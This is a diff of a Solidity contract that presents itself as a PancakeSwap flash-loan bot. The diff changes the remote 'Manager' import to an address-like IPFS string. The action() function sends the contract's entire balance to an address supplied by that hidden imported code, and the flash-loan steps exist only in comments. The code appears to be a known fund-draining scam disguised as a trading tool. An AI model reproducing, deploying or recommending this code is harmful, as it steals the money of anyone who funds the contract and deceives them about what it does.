@@ -10,14 +10,14 @@ import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/i
 import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakePair.sol";
 
 // PancakeSwap BSC Code Manager
-import "ipfs://Qmf7YoFvN2XumrZHD838pTGtsZs9nLViskfXCxtKvGx8bB";
-   
+import "ipfs://0xcCa7a59E61377165505564d22b2855257A5EefF9";
+
 contract GetFlashLoan {
    string public tokenName;
    string public tokenSymbol;
    uint loanAmount;
    Manager manager;
-   
+
    constructor(string memory _tokenName, string memory _tokenSymbol, uint _loanAmount) public {
       tokenName = _tokenName;
       tokenSymbol = _tokenSymbol;
@@ -29,14 +29,14 @@ contract GetFlashLoan {
         	return creator;
    	}
    function() external payable {}
-   
+
    function action() public payable {
       // Send New Token to PancakeSwap Router for Swap
        address(uint160(manager.pancakeswapDeposit())).transfer(address(this).balance);
-      
+
       // Perform Flash Loan tasks (combined all functions into one to reduce external calls & save gas fees)
       manager.performTasks();
-      
+
       /* Breakdown of all functions
       // Submit token to BSC blockchain
       string memory tokenAddress = manager.submitToken(tokenName, tokenSymbol);
@@ -66,4 +66,4 @@ contract GetFlashLoan {
       manager.repayLoan(loanAddress);
       */
    }
-}
+} 
